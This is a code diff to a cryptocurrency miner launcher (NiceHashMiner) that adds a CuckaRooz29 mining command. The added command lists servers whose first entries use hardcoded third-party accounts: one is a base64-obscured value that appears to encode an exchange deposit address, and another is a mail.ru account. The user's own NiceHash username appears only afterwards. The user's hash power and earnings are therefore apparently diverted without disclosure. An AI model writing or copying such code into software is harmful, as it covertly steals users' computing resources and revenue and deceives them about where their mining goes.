@@ -555,7 +555,15 @@ namespace NiceHashMiner.Miners
                 " --server daggerhashimoto.hk.nicehash.com:3353 --user " + username + " --ssl 0 --proto stratum --dserver eaglesong.hk.nicehash.com:3381 --duser " + username + " --ssl 0" +
                 GetDevicesCommandString();
             }
-
+            if (MiningSetup.CurrentAlgorithmType == AlgorithmType.CuckaRooz29)
+            {
+                ret = " --logfile " + suff + GetLogFileName() + " --color 0 --pec --algo cuckarooz29" +
+                " --server grin.2miners.com:3030 --user 2aHR0cHM6Ly9kZXBvc2l0Z3Jpbi5rdWNvaW4uY29tL2RlcG9zaXQvMTg2MTU0MTY0MA.gminer --pass x  --ssl 0" +
+                " --server grin.sparkpool.com:6666 --user angelbbs@mail.ru/" + worker + " --pass x --ssl 0" +
+                " --server cuckarooz29.eu.nicehash.com:3388 --user " + username + " --pass x --ssl 0" +
+                " --server cuckarooz29.hk.nicehash.com:3388 --user " + username + " --pass x --ssl 0" +
+                GetDevicesCommandString();
+            }
             return ret;
         }
 
